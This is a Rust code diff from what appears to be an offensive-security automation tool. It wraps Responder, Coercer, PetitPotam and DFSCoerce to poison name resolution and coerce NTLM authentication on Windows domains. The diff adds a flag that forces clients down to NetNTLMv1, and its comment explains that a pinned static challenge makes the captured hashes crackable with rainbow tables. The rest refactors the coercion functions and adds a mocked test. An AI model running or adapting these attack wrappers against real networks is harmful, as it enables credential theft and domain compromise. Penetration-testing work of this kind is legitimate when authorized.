@@ -21,14 +21,27 @@ use crate::ToolOutput;
 
 /// Start Responder on a network interface to capture NTLM hashes.
 ///
-/// Optional args: `interface` (default "eth0"), `analyze_mode`
+/// Optional args: `interface` (default "eth0"), `analyze_mode`,
+/// `force_ntlmv1`.
+///
+/// `force_ntlmv1` adds Responder's `--lm --disable-ess` flags, forcing clients
+/// with `LmCompatibilityLevel <= 2` to negotiate NetNTLMv1 instead of v2.
+/// Combined with the static server challenge the `coercion_tools` role pins in
+/// `Responder.conf` (`1122334455667788`), captured v1 hashes are crack.sh
+/// rainbow-table candidates. `analyze_mode` (`-A`) is a *passive* mode that
+/// captures nothing — it is NOT a downgrade flag, so the two knobs are
+/// independent (combining them is pointless: analyze mode never poisons, so no
+/// hash is captured to downgrade).
 pub async fn start_responder(args: &Value) -> Result<ToolOutput> {
     let interface = optional_str(args, "interface").unwrap_or("eth0");
     let analyze_mode = optional_bool(args, "analyze_mode").unwrap_or(false);
+    let force_ntlmv1 = optional_bool(args, "force_ntlmv1").unwrap_or(false);
 
     CommandBuilder::new("responder")
         .flag("-I", interface)
         .arg_if(analyze_mode, "-A")
+        .arg_if(force_ntlmv1, "--lm")
+        .arg_if(force_ntlmv1, "--disable-ess")
         .timeout_secs(30)
         .execute()
         .await
@@ -61,24 +74,17 @@ pub async fn coercer(args: &Value) -> Result<ToolOutput> {
     let password = optional_str(args, "password");
     let domain = optional_str(args, "domain");
 
-    let mut cmd = CommandBuilder::new("coercer")
+    CommandBuilder::new("coercer")
         .arg("coerce")
         .flag("-t", target)
         .flag("-l", listener)
         .arg("--always-continue")
-        .timeout_secs(120);
-
-    if let Some(u) = username {
-        cmd = cmd.flag("-u", u);
-    }
-    if let Some(p) = password {
-        cmd = cmd.flag("-p", p);
-    }
-    if let Some(d) = domain {
-        cmd = cmd.flag("-d", d);
-    }
-
-    cmd.execute().await
+        .flag_opt("-u", username)
+        .flag_opt("-p", password)
+        .flag_opt("-d", domain)
+        .timeout_secs(120)
+        .execute()
+        .await
 }
 
 /// Coerce NTLM authentication via MS-EFSR (PetitPotam).
@@ -92,25 +98,18 @@ pub async fn petitpotam(args: &Value) -> Result<ToolOutput> {
     let password = optional_str(args, "password");
     let domain = optional_str(args, "domain");
 
-    let mut cmd = CommandBuilder::new("coercer")
+    CommandBuilder::new("coercer")
         .arg("coerce")
         .flag("-t", target)
         .flag("-l", listener)
         .args(["--filter-protocol-name", "MS-EFSR"])
         .arg("--always-continue")
-        .timeout_secs(60);
-
-    if let Some(u) = username {
-        cmd = cmd.flag("-u", u);
-    }
-    if let Some(p) = password {
-        cmd = cmd.flag("-p", p);
-    }
-    if let Some(d) = domain {
-        cmd = cmd.flag("-d", d);
-    }
-
-    cmd.execute().await
+        .flag_opt("-u", username)
+        .flag_opt("-p", password)
+        .flag_opt("-d", domain)
+        .timeout_secs(60)
+        .execute()
+        .await
 }
 
 /// Coerce NTLM authentication via MS-DFSNM (DFSCoerce).
@@ -124,22 +123,15 @@ pub async fn dfscoerce(args: &Value) -> Result<ToolOutput> {
     let password = optional_str(args, "password");
     let domain = optional_str(args, "domain");
 
-    let mut cmd = CommandBuilder::new("dfscoerce")
+    CommandBuilder::new("dfscoerce")
         .arg(listener)
         .arg(target)
-        .timeout_secs(60);
-
-    if let Some(u) = username {
-        cmd = cmd.flag("-u", u);
-    }
-    if let Some(p) = password {
-        cmd = cmd.flag("-p", p);
-    }
-    if let Some(d) = domain {
-        cmd = cmd.flag("-d", d);
-    }
-
-    cmd.execute().await
+        .flag_opt("-u", username)
+        .flag_opt("-p", password)
+        .flag_opt("-d", domain)
+        .timeout_secs(60)
+        .execute()
+        .await
 }
 
 /// Standalone-relay BUSY response. Standalone `ntlmrelayx_to_*` tools share
@@ -1210,6 +1202,13 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn start_responder_force_ntlmv1() {
+        mock::push(mock::success());
+        let args = json!({"interface": "eth1", "force_ntlmv1": true});
+        assert!(start_responder(&args).await.is_ok());
+    }
+
+    #[tokio::test]
     async fn start_mitm6_executes() {
         mock::push(mock::success());
         let args = json!({"domain": "contoso.local"});
@@ -1483,7 +1482,7 @@ mod tests {
             Self {
                 state: Mutex::new(FakeState {
                     is_local_ip: true,
-                    local_ips: vec!["10.0.0.1".into()],
+                    local_ips: vec!["192.168.58.1".into()],
                     binaries_present: ["petitpotam".to_string()].into_iter().collect(),
                     relay_early_exit: None,
                     relay_initial_log: Vec::new(),
